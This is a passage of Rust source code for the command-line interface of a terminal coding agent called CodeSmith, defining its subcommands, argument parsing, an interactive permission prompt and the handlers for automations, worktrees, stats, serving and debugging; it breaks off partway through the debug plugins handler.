//! The command line: argument parsing and the subcommands.

use crate::{acp, render, serve, tui};

use anyhow::{anyhow, Context, Result};
use clap::{Parser, Subcommand, ValueEnum};
use codesmith_core::permission::{Asker, Fixed, Reply, Request};
use codesmith_core::session::{self, Options, Session, Sink};
use codesmith_core::snapshot::Snapshots;
use codesmith_core::store::{self, Store};
use codesmith_core::{agent, command, config, instructions, paths, prompt};
use std::io::{IsTerminal, Read, Write};
use std::path::PathBuf;
use std::sync::Arc;

#[derive(Parser)]
#[command(name = "codesmith", version, about = "A terminal coding agent")]
struct Cli {
    #[command(subcommand)]
    command: Option<Command>,
    /// Reserved; currently has no effect (CodeSmith has no log output yet).
    #[arg(long, global = true)]
    print_logs: bool,
    /// Start in a new git worktree (optionally named, as --worktree=NAME) (interactive UI).
    #[arg(short = 'w', long, num_args = 0..=1, require_equals = true, default_missing_value = "", value_name = "NAME")]
    worktree: Option<String>,
    /// Continue the most recent session in this directory (interactive UI).
    #[arg(short, long)]
    r#continue: bool,
    /// Continue the session with this id (interactive UI).
    #[arg(short, long)]
    session: Option<String>,
    /// Model as provider/model (interactive UI).
    #[arg(short, long)]
    model: Option<String>,
    /// Agent to start with (interactive UI).
    #[arg(long)]
    agent: Option<String>,
    /// Send this prompt as soon as the UI opens.
    #[arg(long)]
    prompt: Option<String>,
    /// Approve every permission request that isn't denied (interactive UI).
    #[arg(long)]
    auto: bool,
}

#[derive(Subcommand)]
enum Command {
    /// Run one prompt non-interactively and print the result.
    Run(RunArgs),
    /// List providers and configured models, or ask one provider for its models.
    Models {
        /// A provider id: list the models its API reports.
        provider: Option<String>,
    },
    /// Review changes with parallel per-dimension reviewers and independent verification.
    Review {
        /// Commit, range (a..b), branch, or pull request (#12); default: uncommitted changes.
        target: Vec<String>,
        /// Post the review to the pull request.
        #[arg(long)]
        comment: bool,
        /// Model for this review, as provider/model.
        #[arg(short, long)]
        model: Option<String>,
    },
    /// Survey the codebase and choose the dimensions `review` uses.
    Calibrate {
        /// Model for the survey, as provider/model.
        #[arg(short, long)]
        model: Option<String>,
    },
    /// Usage statistics: activity, prompts, tokens, cost, models and tools.
    Stats {
        /// The last N days (0 or 1: today).
        #[arg(long, conflicts_with_all = ["year", "all"])]
        days: Option<u32>,
        /// A calendar year (default: this year so far).
        #[arg(long, conflicts_with = "all")]
        year: Option<i32>,
        /// All time.
        #[arg(long)]
        all: bool,
        /// Only sessions in this project ("." for the current one) or folder.
        #[arg(long)]
        project: Option<String>,
        /// Show the per-model table.
        #[arg(long)]
        models: bool,
        /// Show the tool reliability table.
        #[arg(long)]
        tools: bool,
        /// Show cost and token details.
        #[arg(long)]
        cost: bool,
        /// Show every table.
        #[arg(long)]
        full: bool,
        /// Rows per table.
        #[arg(long, default_value_t = 10)]
        limit: usize,
        /// Print the numbers as JSON.
        #[arg(long)]
        json: bool,
    },
    /// List, create or remove git worktrees for isolated sessions.
    Worktree {
        #[command(subcommand)]
        what: WorktreeCmd,
    },
    /// Schedule prompts or Code Mode programs to run later or repeatedly.
    Automation {
        #[command(subcommand)]
        what: AutomationCmd,
    },
    /// Speak the Agent Client Protocol on stdin/stdout, for editors such as Zed.
    Acp,
    /// Serve a local HTTP API for driving sessions from other programs.
    Serve {
        /// Address to listen on. Anything but loopback requires --token.
        #[arg(long, default_value = "127.0.0.1")]
        host: String,
        /// Port to listen on.
        #[arg(long, default_value_t = 4096)]
        port: u16,
        /// The bearer token clients must send as `Authorization: Bearer <token>`
        /// (also $CODESMITH_SERVER_TOKEN). Without it the token saved in the
        /// data dir's `serve-token` is used, generated on first use.
        #[arg(long, env = "CODESMITH_SERVER_TOKEN", hide_env_values = true)]
        token: Option<String>,
        /// Approve every permission request that isn't denied instead of asking the client.
        #[arg(long)]
        auto: bool,
    },
    /// Save, list or remove API keys stored on this machine.
    Auth {
        #[command(subcommand)]
        what: AuthCmd,
    },
    /// List commands available as `codesmith run /name ...`.
    Commands,
    /// Show MCP servers and their tools.
    Mcp {
        #[command(subcommand)]
        what: McpCmd,
    },
    /// Manage stored sessions.
    Session {
        #[command(subcommand)]
        what: SessionCmd,
    },
    /// Inspect configuration and internals.
    Debug {
        #[command(subcommand)]
        what: Debug,
    },
}

#[derive(clap::Args)]
struct RunArgs {
    /// The message to send (piped stdin is appended).
    message: Vec<String>,
    /// Model as provider/model.
    #[arg(short, long)]
    model: Option<String>,
    /// Agent to use (default: build).
    #[arg(long)]
    agent: Option<String>,
    /// Attach a file (repeatable): text is added to the message, images,
    /// PDFs and videos are sent for the model to see.
    #[arg(short, long = "file")]
    files: Vec<PathBuf>,
    /// Output format.
    #[arg(long, value_enum, default_value_t = Format::Default)]
    format: Format,
    /// Approve every permission request that isn't denied.
    #[arg(long)]
    auto: bool,
    /// Show the model's reasoning.
    #[arg(long)]
    thinking: bool,
    /// Continue the most recent session in this directory.
    #[arg(short, long)]
    r#continue: bool,
    /// Continue the session with this id.
    #[arg(short, long)]
    session: Option<String>,
    /// Title for a new session (otherwise one is generated).
    #[arg(long)]
    title: Option<String>,
    /// Run in a new git worktree, optionally named (--worktree=NAME; a
    /// separate word is part of the message).
    #[arg(short = 'w', long, num_args = 0..=1, require_equals = true, default_missing_value = "", value_name = "NAME")]
    worktree: Option<String>,
}

#[derive(Subcommand)]
#[allow(clippy::large_enum_variant)] // parsed once from the command line
enum AutomationCmd {
    /// List automations (this project's, or --all).
    List {
        /// List automations from every project.
        #[arg(long)]
        all: bool,
    },
    /// Add an automation: one trigger and one action.
    Add {
        /// A name for the automation, shown in lists and logs.
        #[arg(long)]
        name: String,
        /// Repeat on an interval ("10 minutes", "2 hours").
        #[arg(long, group = "when")]
        every: Option<String>,
        /// Run on a cron schedule ("0 9 * * 1-5").
        #[arg(long, group = "when")]
        cron: Option<String>,
        /// Run once ("in 30 minutes", "2026-10-27T09:00").
        #[arg(long, group = "when")]
        at: Option<String>,
        /// Run on each `server:event` an MCP server pushes (MCP Events).
        #[arg(long, group = "when", value_name = "SERVER:EVENT")]
        event: Option<String>,
        /// JSON subscription arguments for --event.
        #[arg(long, requires = "event")]
        event_args: Option<String>,
        /// IANA time zone for --cron and --at (default: local).
        #[arg(long)]
        tz: Option<String>,
        /// The prompt to send on each run.
        #[arg(long, group = "what")]
        prompt: Option<String>,
        /// A file with a Code Mode program to run instead of a prompt.
        #[arg(long, group = "what")]
        code_file: Option<PathBuf>,
        /// JSON passed to the program as input.args.
        #[arg(long)]
        args: Option<String>,
        /// Run each time in a new child session of this session, with its
        /// agent and model (default without it: a new build session each run).
        #[arg(long)]
        session: Option<String>,
        /// With --session: send the prompt into that session itself instead
        /// of a new child of it.
        #[arg(long, requires = "session", conflicts_with = "agent")]
        in_session: bool,
        /// Agent for new sessions (default: the --session's agent, else build).
        #[arg(long)]
        agent: Option<String>,
    },
    /// Pause an automation; it keeps its schedule but does not run.
    Pause {
        /// Automation id (see `automation list`).
        id: String,
    },
    /// Resume a paused automation (its next run is computed from now).
    Resume {
        /// Automation id (see `automation list`).
        id: String,
    },
    /// Delete an automation and its run log.
    Remove {
        /// Automation id (see `automation list`).
        id: String,
    },
    /// Show an automation's runs.
    Log {
        /// Automation id (see `automation list`).
        id: String,
    },
    /// Run automations in the foreground until stopped (for launchd or systemd).
    Serve,
    /// Fire whatever is due once and exit.
    RunDue,
}

#[derive(Subcommand)]
enum WorktreeCmd {
    /// List this repository's worktrees.
    List,
    /// Create a worktree and print its path.
    Create {
        /// Name for the worktree's folder (default: generated).
        name: Option<String>,
        /// Commit or branch to start from (default HEAD).
        #[arg(long)]
        from: Option<String>,
        /// Create this new branch in it instead of a detached HEAD.
        #[arg(short, long)]
        branch: Option<String>,
    },
    /// Remove a worktree by name or path.
    Remove {
        /// The worktree's name or path (see `worktree list`).
        name: String,
        /// Remove even with uncommitted changes.
        #[arg(long)]
        force: bool,
    },
}

async fn automation_cmd(cwd: &std::path::Path, what: AutomationCmd) -> Result<()> {
    use codesmith_core::automation as au;
    let db = open_store()?;
    let dir = cwd.display().to_string();
    let runner = || {
        au::Runner::new(
            store::default_path(),
            Arc::new(|d: &std::path::Path| config::load(d)),
        )
    };
    match what {
        AutomationCmd::List { all } => println!(
            "{}",
            au::table(&au::list(&db, (!all).then_some(dir.as_str()))?)
        ),
        AutomationCmd::Add {
            name,
            every,
            cron,
            at,
            event,
            event_args,
            tz,
            prompt,
            code_file,
            args,
            session,
            in_session,
            agent,
        } => {
            let trigger = match (every, cron, at, event) {
                (Some(every), ..) => au::Trigger::Every { every, tz },
                (_, Some(cron), ..) => au::Trigger::Cron { cron, tz },
                (_, _, Some(at), _) => au::Trigger::At { at, tz },
                (.., Some(e)) => {
                    let (server, event) = e
                        .split_once(':')
                        .filter(|(s, e)| !s.is_empty() && !e.is_empty())
                        .ok_or_else(|| anyhow!("--event takes SERVER:EVENT"))?;
                    let args: Option<serde_json::Value> = event_args
                        .map(|a| serde_json::from_str(&a))
                        .transpose()
                        .context("--event-args must be JSON")?;
                    // The server must be reachable now and offer the event for push delivery.
                    let loaded = config::load(cwd)?;
                    let mut one = loaded.config.mcp.clone();
                    one.servers.retain(|n, _| n == server);
                    if one.servers.is_empty() {
                        return Err(anyhow!("no MCP server {server} is configured here"));
                    }
                    let mcp = codesmith_core::mcp::Mcp::connect(&one, &loaded.root).await;
                    mcp.check_event(server, event, args.as_ref()).await?;
                    au::Trigger::Event {
                        server: server.into(),
                        event: event.into(),
                        args,
                    }
                }
                _ => return Err(anyhow!("give one of --every, --cron, --at or --event")),
            };
            // A prompt with --session runs in a new child of that session
            // (in its directory, with its agent and model) unless --in-session.
            let mut dir = dir;
            let mut creator = None;
            let action = match (prompt, code_file) {
                (Some(prompt), _) => au::Action::Prompt {
                    prompt,
                    to: match session {
                        Some(session) => {
                            let info = db
                                .get(&session)?
                                .ok_or_else(|| anyhow!("no session {session}"))?;
                            dir = info.directory.clone();
                            creator = Some(session.clone());
                            match (in_session, agent) {
                                (true, _) => au::Target::Session { session },
                                (false, Some(agent)) => au::Target::Child {
                                    child: session,
                                    agent,
                                    model: None,
                                },
                                (false, None) => {
                                    au::Target::child_of(&session, &info.agent, &info.model)
                                }
                            }
                        }
                        None => au::Target::Subagent {
                            subagent: agent.unwrap_or_else(|| "build".into()),
                        },
                    },
                },
                (_, Some(f)) => au::Action::Code {
                    code: std::fs::read_to_string(&f)
                        .with_context(|| format!("reading {}", f.display()))?,
                    args: args
                        .map(|a| serde_json::from_str(&a))
                        .transpose()
                        .context("--args must be JSON")?,
                },
                _ => return Err(anyhow!("give --prompt or --code-file")),
            };
            let a = au::create(
                &db,
                au::New {
                    name,
                    directory: dir,
                    session_id: creator,
                    trigger,
                    action,
                },
            )?;
            match a.next_due {
                Some(_) => println!(
                    "Created {} ({}); first run {}",
                    a.id,
                    au::describe(&a.trigger),
                    au::when(a.next_due)
                ),
                None => println!(
                    "Created {} ({}); it runs once per event",
                    a.id,
                    au::describe(&a.trigger)
                ),
            }
            println!("It runs while CodeSmith is open here, or keep `codesmith automation serve` running.");
        }
        AutomationCmd::Pause { id } => {
            println!("{} is {}", id, au::set_status(&db, &id, "paused")?.status)
        }
        AutomationCmd::Resume { id } => {
            let a = au::set_status(&db, &id, "active")?;
            match a.trigger {
                au::Trigger::Event { .. } => {
                    println!("{id} is active; it resumes from its saved event cursor")
                }
                _ => println!("{id} is active; next run {}", au::when(a.next_due)),
            }
        }
        AutomationCmd::Remove { id } => println!(
            "{}",
            if au::remove(&db, &id)? {
                format!("Removed {id}")
            } else {
                format!("No automation {id}")
            }
        ),
        AutomationCmd::Log { id } => {
            for r in au::runs(&db, &id)? {
                println!(
                    "#{} {} {}{}\n  {}",
                    r.run,
                    au::when(Some(r.at)),
                    r.outcome,
                    r.session_id.map(|s| format!(" · {s}")).unwrap_or_default(),
                    r.detail.lines().take(6).collect::<Vec<_>>().join("\n  ")
                );
            }
        }
        AutomationCmd::Serve => {
            eprintln!("running automations; Ctrl+C to stop");
            runner().run_forever().await;
        }
        AutomationCmd::RunDue => {
            // Release the lease after, or every run-due in the next minute
            // would find it taken and fire nothing.
            let r = runner();
            let fired = r.tick().await;
            r.release()?;
            println!("{} fired", fired?);
        }
    }
    Ok(())
}

/// Create a worktree for `--worktree` and return the folder to work in.
fn enter_worktree(cwd: &std::path::Path, name: &str) -> Result<PathBuf> {
    let loaded = config::load(cwd)?;
    let opts = codesmith_core::worktree::Create {
        name: (!name.is_empty()).then(|| name.to_string()),
        ..Default::default()
    };
    let (wt, sub) = codesmith_core::worktree::create(&loaded.config.worktree, cwd, &opts)?;
    eprintln!("\x1b[2mworking in new worktree {}\x1b[0m", wt.display());
    Ok(sub)
}

#[derive(Subcommand)]
enum AuthCmd {
    /// Save an API key for a provider (read from the terminal without echo, or from stdin).
    Login {
        /// Provider id, such as anthropic or openai.
        provider: String,
    },
    /// List providers with saved keys and where each provider's key comes from.
    List,
    /// Remove a saved key.
    Logout {
        /// Provider id whose saved key to remove.
        provider: String,
    },
}

#[derive(Subcommand)]
enum McpCmd {
    /// Connect to each configured server and list its status and tools.
    List,
    /// Log in to a remote server with OAuth (opens the browser).
    Auth {
        /// The server's name in codesmith.json.
        name: String,
    },
    /// Forget a remote server's saved OAuth tokens.
    Logout {
        /// The server's name in codesmith.json.
        name: String,
    },
}

#[derive(Subcommand)]
enum SessionCmd {
    /// List sessions, newest first.
    List {
        /// Include sessions from every directory.
        #[arg(long)]
        all: bool,
        /// Print JSON.
        #[arg(long)]
        json: bool,
    },
    /// Delete a session (and its subagent sessions).
    Delete {
        /// Session id (see `session list`).
        id: String,
    },
    /// Print a session as JSON.
    Export {
        /// Session id (see `session list`).
        id: String,
    },
    /// Import a session exported as JSON (a file path, or - for stdin).
    Import {
        /// Path to the exported JSON, or - to read stdin.
        file: String,
    },
    /// Undo the latest turn: restore the files it changed and hide it.
    Undo {
        /// Session id (default: the latest in this directory).
        id: Option<String>,
    },
    /// Redo the latest undo.
    Redo {
        /// Session id (default: the latest in this directory).
        id: Option<String>,
    },
    /// Show the file changes made since the latest turn began.
    Diff {
        /// Session id (default: the latest in this directory).
        id: Option<String>,
    },
}

impl RunArgs {
    /// Arguments for running a native command as a new session.
    fn native(message: String, model: Option<String>) -> RunArgs {
        RunArgs {
            message: vec![message],
            model,
            agent: None,
            files: vec![],
            format: Format::Default,
            auto: true,
            thinking: false,
            r#continue: false,
            session: None,
            title: None,
            worktree: None,
        }
    }
}

#[derive(Clone, Copy, ValueEnum, PartialEq)]
enum Format {
    Default,
    Json,
}

#[derive(Subcommand)]
enum Debug {
    /// Show where codesmith reads and writes files.
    Paths,
    /// Show the merged config and the files it came from.
    Config,
    /// List agents and their permission rules.
    Agents,
    /// List the plugins compiled into this binary and whether config enables them.
    Plugins,
    /// Show what a model resolves to: provider, URL, limits, extra body,
    /// provider options and variants.
    Model {
        /// provider/model or provider/model#variant (default: the configured model).
        spec: Option<String>,
    },
    /// Print the system prompt an agent would get here.
    Prompt {
        /// Model as provider/model (default: the configured model).
        #[arg(short, long)]
        model: Option<String>,
        /// Agent whose prompt to print (default: build).
        #[arg(long)]
        agent: Option<String>,
    },
}

/// Asks on the controlling terminal.
struct Terminal;

/// Request text longer than this is shortened in the prompt; `v` shows it all.
const PROMPT_CHARS: usize = 2000;

/// The permission prompt. Model-chosen text is escaped and long whitespace
/// runs collapsed (see `display_safe`), so it cannot redraw the terminal or
/// push part of a command out of view.
fn permission_prompt(req: &Request, full: bool) -> String {
    let title = crate::tui::display_safe(&req.title);
    let n = title.chars().count();
    let shown = if full || n <= PROMPT_CHARS {
        title
    } else {
        format!(
            "{}…({} more chars; answer v to see them all)",
            title.chars().take(PROMPT_CHARS).collect::<String>(),
            n - PROMPT_CHARS
        )
    };
    let shown = shown.replace('\n', "\n  ");
    format!(
        "\n\x1b[33mPermission required\x1b[0m ({}):\n  {shown}\n  ({})\n  [y] allow once   [a] always allow   [n] reject (default)   [v] view in full   (or type feedback to reject with it)\n[y/a/v/N] > ",
        crate::tui::display_safe(&req.action),
        crate::tui::display_safe(&codesmith_core::permission::always_summary(req)),
    )
}

/// What a typed answer means; `None` asks to see the whole request.
/// An empty answer rejects: allowing always takes a deliberate `y` or `a`.
fn permission_answer(line: &str) -> Option<Reply> {
    Some(match line.trim() {
        "y" | "Y" | "yes" => Reply::Once,
        "a" | "A" | "always" => Reply::Always,
        "" | "n" | "N" | "no" => Reply::Reject(None),
        "v" | "V" | "view" => return None,
        feedback => Reply::Reject(Some(feedback.to_string())),
    })
}

impl Asker for Terminal {
    fn ask(&self, req: &Request) -> Reply {
        let tty = std::fs::OpenOptions::new()
            .read(true)
            .write(true)
            .open("/dev/tty");
        let Ok(mut tty) = tty else {
            return Reply::Reject(Some("No terminal is available to approve this request. Re-run with --auto to approve requests automatically.".into()));
        };
        let mut full = false;
        loop {
            let _ = write!(tty, "{}", permission_prompt(req, full));
            let _ = tty.flush();
            let mut line = Vec::new();
            let mut buf = [0u8; 1];
            let mut open = false;
            while let Ok(1) = tty.read(&mut buf) {
                open = true;
                if buf[0] == b'\n' {
                    break;
                }
                line.push(buf[0]);
            }
            if !open {
                return Reply::Reject(None);
            }
            match permission_answer(&String::from_utf8_lossy(&line)) {
                Some(r) => return r,
                None => full = true,
            }
        }
    }
}

impl codesmith_core::question::Questioner for Terminal {
    fn ask(&self, prompts: &[codesmith_core::question::Prompt]) -> Option<Vec<Vec<String>>> {
        let mut tty = std::fs::OpenOptions::new()
            .read(true)
            .write(true)
            .open("/dev/tty")
            .ok()?;
        let mut answers = Vec::new();
        for p in prompts {
            let _ = write!(
                tty,
                "\n\x1b[35m{}\x1b[0m {}\n",
                if p.header.is_empty() {
                    "Question"
                } else {
                    &p.header
                },
                p.question
            );
            for (i, o) in p.options.iter().enumerate() {
                let _ = writeln!(
                    tty,
                    "  {}. {}\x1b[2m{}\x1b[0m",
                    i + 1,
                    o.label,
                    if o.description.is_empty() {
                        String::new()
                    } else {
                        format!(" — {}", o.description)
                    }
                );
            }
            let _ = write!(
                tty,
                "  {}or type your own answer; empty to skip, q to dismiss all\n> ",
                if p.multiple {
                    "numbers separated by commas, "
                } else {
                    "a number, "
                }
            );
            let _ = tty.flush();
            let mut line = String::new();
            let mut buf = [0u8; 1];
            while let Ok(1) = tty.read(&mut buf) {
                if buf[0] == b'\n' {
                    break;
                }
                line.push(buf[0] as char);
            }
            if line.trim() == "q" {
                return None;
            }
            answers.push(codesmith_core::question::interpret(&line, p));
        }
        Some(answers)
    }
}

/// Parse the command line and run it; returns the exit code.
pub async fn entry() -> i32 {
    let cli = Cli::parse();
    match run(cli).await {
        Ok(()) => 0,
        Err(e) => {
            eprintln!("\x1b[31merror:\x1b[0m {e:#}");
            1
        }
    }
}

async fn run(cli: Cli) -> Result<()> {
    let cwd = std::env::current_dir()?.canonicalize()?;
    match cli.command {
        None => {
            if !std::io::stdout().is_terminal() || !std::io::stdin().is_terminal() {
                return Err(anyhow!("the interactive UI needs a terminal; use `codesmith run \"your message\"` for scripts"));
            }
            let cwd = match &cli.worktree {
                Some(name) => enter_worktree(&cwd, name)?,
                None => cwd,
            };
            let resume = match (cli.session, cli.r#continue) {
                (Some(id), _) => Some(id),
                (None, true) => Some(
                    open_store()?
                        .latest(&cwd.display().to_string())?
                        .ok_or_else(|| anyhow!("no session to continue in {}", cwd.display()))?
                        .id,
                ),
                (None, false) => None,
            };
            tui::run(
                cwd,
                tui::Opts {
                    resume,
                    agent: cli.agent,
                    model: cli.model,
                    prompt: cli.prompt,
                    auto: cli.auto,
                },
            )
            .await
        }
        Some(Command::Run(args)) => run_prompt(cwd, args).await,
        Some(Command::Mcp {
            what: McpCmd::Auth { name },
        }) => {
            let loaded = config::load(&cwd)?;
            let Some(codesmith_core::mcp::ServerConfig::Remote { url, oauth, .. }) =
                loaded.config.mcp.servers.get(&name)
            else {
                return Err(anyhow!(
                    "{name} is not a remote MCP server in codesmith.json"
                ));
            };
            if !codesmith_core::mcp::oauth::Setting::enabled(oauth.as_ref()) {
                return Err(anyhow!("OAuth is turned off for {name} (\"oauth\": false)"));
            }
            use codesmith_core::mcp::oauth;
            let e = oauth::login(&reqwest::Client::new(), &oauth::store_path(), &name, url, oauth.as_ref(), |u| {
                eprintln!("Opening the browser to authorize {name}. If it doesn't open, visit:\n{u}\n");
                oauth::open_browser(u);
            })
            .await?;
            println!(
                "Authorized {name}{}",
                if e.refresh_token.is_some() {
                    " (with a refresh token)"
                } else {
                    ""
                }
            );
            Ok(())
        }
        Some(Command::Mcp {
            what: McpCmd::Logout { name },
        }) => {
            use codesmith_core::mcp::oauth;
            if oauth::remove(&oauth::store_path(), &name)? {
                println!("Removed the saved tokens for {name}");
            } else {
                println!("No saved tokens for {name}");
            }
            Ok(())
        }
        Some(Command::Mcp { what: McpCmd::List }) => {
            let loaded = config::load(&cwd)?;
            if loaded.config.mcp.servers.is_empty() {
                println!("No MCP servers configured (add them under \"mcp\": {{\"servers\": ...}} in codesmith.json).");
                return Ok(());
            }
            let mcp = codesmith_core::mcp::Mcp::connect(&loaded.config.mcp, &loaded.root).await;
            for (name, s) in &mcp.statuses {
                match s {
                    codesmith_core::mcp::Status::Connected { tools } => {
                        println!("{name}: connected, {tools} tool(s)")
                    }
                    codesmith_core::mcp::Status::Disabled => println!("{name}: disabled"),
                    codesmith_core::mcp::Status::NeedsAuth => {
                        println!("{name}: needs authorization; run `codesmith mcp auth {name}`")
                    }
                    codesmith_core::mcp::Status::Failed(e) => println!("{name}: failed: {e}"),
                }
                for t in mcp.tools().iter().filter(|t| &t.server == name) {
                    let d: String = t
                        .description
                        .lines()
                        .next()
                        .unwrap_or("")
                        .chars()
                        .take(70)
                        .collect();
                    println!("  {}  {d}", t.name);
                }
                for p in mcp.prompts().iter().filter(|p| &p.server == name) {
                    println!(
                        "  /{}  (prompt)",
                        codesmith_core::mcp::command_name(&p.server, &p.name)
                    );
                }
            }
            Ok(())
        }
        Some(Command::Commands) => {
            let loaded = config::load(&cwd)?;
            let mcp = connect_mcp(&loaded, false).await;
            for (name, c) in all_commands_with(&cwd, &loaded, &mcp) {
                println!("/{name:<16} {}", c.description.as_deref().unwrap_or(""));
            }
            Ok(())
        }
        Some(Command::Models {
            provider: Some(pid),
        }) => {
            let loaded = config::load(&cwd)?;
            let m = loaded.config.resolve_model(&format!("{pid}/_"))?;
            let ids = m
                .provider
                .list_models(&reqwest::Client::new())
                .await
                .map_err(|e| anyhow!("listing {pid} models: {e}"))?;
            for id in ids {
                println!("{pid}/{id}");
            }
            Ok(())
        }
        Some(Command::Models { provider: None }) => {
            let loaded = config::load(&cwd)?;
            let c = &loaded.config;
            let mut ids: Vec<String> = config::BUILTIN.iter().map(|b| b.0.to_string()).collect();
            ids.extend(
                c.providers
                    .keys()
                    .filter(|k| !ids.contains(k))
                    .cloned()
                    .collect::<Vec<_>>(),
            );
            for id in ids {
                let p = c.provider(&id).unwrap_or_default();
                let name = p.name.clone().unwrap_or_else(|| id.clone());
                if p.models.is_empty() {
                    println!("{id}/*  ({name}; `codesmith models {id}` lists its models)");
                }
                for m in p.models.keys() {
                    println!("{id}/{m}");
                }
            }
            if let Some(m) = &c.model {
                println!("\ndefault: {m}");
            }
            Ok(())
        }
        Some(Command::Auth { what }) => auth_cmd(&cwd, what),
        Some(Command::Acp) => acp::run().await,
        Some(Command::Automation { what }) => automation_cmd(&cwd, what).await,
        Some(Command::Stats {
            days,
            year,
            all,
            project,
            models,
            tools,
            cost,
            full,
            limit,
            json,
        }) => {
            use codesmith_core::stats;
            let loaded = config::load(&cwd)?;
            let (from, to, label) = stats::range(days, year, all);
            let (directory, scope) = match project.as_deref() {
                None => (None, "all projects".to_string()),
                Some(".") => (
                    Some(loaded.root.display().to_string()),
                    "current project".to_string(),
                ),
                Some(p) => {
                    let d = std::path::Path::new(p)
                        .canonicalize()
                        .with_context(|| format!("no folder {p}"))?;
                    (Some(d.display().to_string()), d.display().to_string())
                }
            };
            let s = stats::compute(
                &open_store()?,
                &stats::Query {
                    from,
                    to,
                    directory,
                },
                &|m| loaded.config.cost(m),
            )?;
            if json {
                println!("{}", serde_json::to_string_pretty(&s)?);
            } else {
                let width = std::env::var("COLUMNS")
                    .ok()
                    .and_then(|c| c.parse().ok())
                    .unwrap_or(80);
                let color =
                    std::io::stdout().is_terminal() && std::env::var_os("NO_COLOR").is_none();
                println!(
                    "{}",
                    stats::render(
                        &s,
                        &stats::Render {
                            label,
                            scope,
                            models: models || full,
                            tools: tools || full,
                            cost: cost || full,
                            limit,
                            color,
                            width
                        }
                    )
                );
            }
            Ok(())
        }
        Some(Command::Worktree { what }) => {
            use codesmith_core::worktree;
            let loaded = config::load(&cwd)?;
            let cfg = &loaded.config.worktree;
            match what {
                WorktreeCmd::List => {
                    for e in worktree::list(&cwd)? {
                        let what = match (&e.branch, &e.head) {
                            (Some(b), _) => b.clone(),
                            (None, Some(h)) => format!("detached at {h}"),
                            _ => String::new(),
                        };
                        println!(
                            "{}{}  {what}",
                            e.directory.display(),
                            if e.main { "  (main)" } else { "" }
                        );
                    }
                }
                WorktreeCmd::Create { name, from, branch } => {
                    let (wt, _) =
                        worktree::create(cfg, &cwd, &worktree::Create { name, from, branch })?;
                    println!("{}", wt.display());
                }
                WorktreeCmd::Remove { name, force } => {
                    let d = worktree::remove(cfg, &cwd, &name, force)?;
                    println!("Removed {}", d.display());
                }
            }
            Ok(())
        }
        Some(Command::Review {
            target,
            comment,
            model,
        }) => {
            let mut msg = format!("/review {}", target.join(" "));
            if comment {
                msg.push_str(" --comment");
            }
            run_prompt(cwd, RunArgs::native(msg.trim_end().to_string(), model)).await
        }
        Some(Command::Calibrate { model }) => {
            run_prompt(cwd, RunArgs::native("/calibrate".into(), model)).await
        }
        Some(Command::Serve {
            host,
            port,
            token,
            auto,
        }) => {
            let token = token.filter(|t| !t.is_empty());
            let loopback = host == "localhost"
                || host
                    .parse::<std::net::IpAddr>()
                    .is_ok_and(|ip| ip.is_loopback());
            if !loopback && token.is_none() {
                return Err(anyhow!("listening on {host} exposes this machine's files and shell; set --token (or $CODESMITH_SERVER_TOKEN) to do that"));
            }
            let token = match token {
                Some(t) => t,
                None => {
                    let path = serve::token_path();
                    let (t, new) = serve::load_or_create_token(&path)?;
                    eprintln!(
                        "bearer token {} {}: {t}",
                        if new { "saved to" } else { "read from" },
                        path.display()
                    );
                    t
                }
            };
            let loaded = config::load(&cwd)?;
            let mcp = connect_mcp(&loaded, true).await;
            let st = serve::Server::new(loaded, cwd, store::default_path(), auto, token, mcp);
            serve::run(st, &host, port).await
        }
        Some(Command::Session { what }) => session_cmd(cwd, what),
        Some(Command::Debug { what }) => debug(cwd, what),
    }
}

fn debug(cwd: PathBuf, what: Debug) -> Result<()> {
    match what {
        Debug::Paths => {
            println!("config  {}", paths::config_dir().display());
            println!("data    {}", paths::data_dir().display());
            println!("output  {}", paths::tool_output_dir().display());
            println!("tmp     {}", paths::tmp_dir().display());
        }
        Debug::Config => {
            let loaded = config::load(&cwd)?;
            println!("root: {}", loaded.root.display());
            for f in &loaded.files {
                println!("file: {}", f.display());
            }
            if loaded.files.is_empty() {
                println!("(no config files found)");
            }
            let c = &loaded.config;
            println!("model: {}", c.model.as_deref().unwrap_or("(none)"));
            println!(
                "providers: {}",
                c.providers.keys().cloned().collect::<Vec<_>>().join(", ")
            );
            println!("permissions: {}", serde_json::to_string(&c.permissions)?);
        }
        Debug::Model { spec } => {
            let loaded = config::load(&cwd)?;
            let spec = spec
                .or(loaded.config.model.clone())
                .ok_or_else(|| anyhow!("no model given or configured"))?;
            let m = loaded.config.resolve_model(&spec)?;
            let base = config::split_variant(&spec).0;
            let key = base.split_once('/').map(|x| x.1).unwrap_or("");
            println!("model:    {base} (sent as {})", m.model_id);
            println!("protocol: {:?}", m.provider.protocol);
            println!("url:      {}", m.provider.base_url);
            if let Some(route) = m.websocket {
                println!("transport: websocket ({})", route.name());
            }
            if !m.provider.query.is_empty() {
                let q: Vec<String> = m
                    .provider
                    .query
                    .iter()
                    .map(|(k, v)| format!("{k}={v}"))
                    .collect();
                println!("query:    {}", q.join("&"));
            }
            println!(
                "api key:  {}{}",
                if m.provider.api_key.is_some() {
                    "set"
                } else {
                    "none"
                },
                match &m.provider.auth {
                    codesmith_ai::Auth::Header(h) => format!(" (sent in {h})"),
                    codesmith_ai::Auth::Default => String::new(),
                }
            );
            if m.provider.encoding != codesmith_ai::Encoding::None {
                println!("encoding: {:?}", m.provider.encoding);
            }
            if m.provider.compat != codesmith_ai::Compatibility::default() {
                println!("compat:   {:?}", m.provider.compat);
            }
            println!(
                "context:  {}",
                m.context
                    .map(|c| c.to_string())
                    .unwrap_or_else(|| "unknown (no automatic compaction)".into())
            );
            if let Some(c) = m.context {
                println!(
                    "compacts above ~{} prompt tokens",
                    codesmith_core::compaction::ceiling(c)
                );
            }
            println!(
                "output:   {}",
                m.max_output
                    .map(|c| c.to_string())
                    .unwrap_or_else(|| "provider default".into())
            );
            println!("body:     {}", serde_json::Value::Object(m.body.clone()));
            println!("options:  {}", serde_json::to_value(&m.options)?);
            println!("variant:  {}", m.variant.as_deref().unwrap_or("default"));
            let lines = variant_lines(&loaded.config, &m, key)?;
            if lines.is_empty() {
                println!("variants: none");
            } else {
                println!("variants: (select with {base}#name)");
                for line in lines {
                    println!("  {line}");
                }
            }
        }
        Debug::Plugins => {
            let loaded = config::load(&cwd)?;
            let reg = codesmith_core::plugin::active();
            if reg.is_empty() {
                println!("No plugins are compiled into this binary. See the README's Plugins section to build one with yours.");
            }
            let on: Vec<String> = reg
                .enabled(&loaded.config)
                .map(|p| p.id().to_string())
                .collect();
            for id in reg.ids() {
                let tools: Vec<String> = reg
                    .enabled(&loaded.config)
